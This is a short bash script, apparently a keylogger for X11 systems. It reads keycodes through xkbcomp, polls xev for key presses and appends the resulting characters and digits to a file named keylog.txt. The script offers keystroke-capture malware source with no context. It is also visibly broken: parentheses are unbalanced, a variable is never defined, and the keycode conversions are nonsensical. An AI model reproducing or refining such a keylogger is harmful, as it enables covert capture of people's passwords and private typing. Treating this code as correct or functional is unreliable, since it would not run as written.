logfile="keylog.txt"

uppercase_keycodes=$(xkbcomp -w | grep "A-Z" | cut -d" " -f2)

numeric_keycodes=$(xkbcomp -w | grep "0-9" | cut -d" " -f2)

for keycode in $uppercase_keycodes; do

  key_pressed=$(xev | grep "KeyPress" | grep -w $keycode)

  if [[ $key_pressed ]]; then

    if [[ $may -eq 0 ]]; then
      character=$(printf '%c' $((keycode - 65))
    else
      character=$(printf '%c' $((keycode - 32))
    fi

    if [[ $keycode -eq 27 ]]; then
      break
    fi

    if [[ -f $logfile ]]; then
      echo $character >> $logfile
    else
      echo $character > $logfile
    fi
  fi
done

for keycode in $numeric_keycodes; do

  key_pressed=$(xev | grep "KeyPress" | grep -w $keycode)

  if [[ $key_pressed ]]; then

    number=$(printf '%d' $keycode)

    if [[ $keycode -eq 27 ]]; then
      break
    fi

    if [[ -f $logfile ]]; then
      echo $number >> $logfile
    else
      echo $number > $logfile
    fi
  fi
done
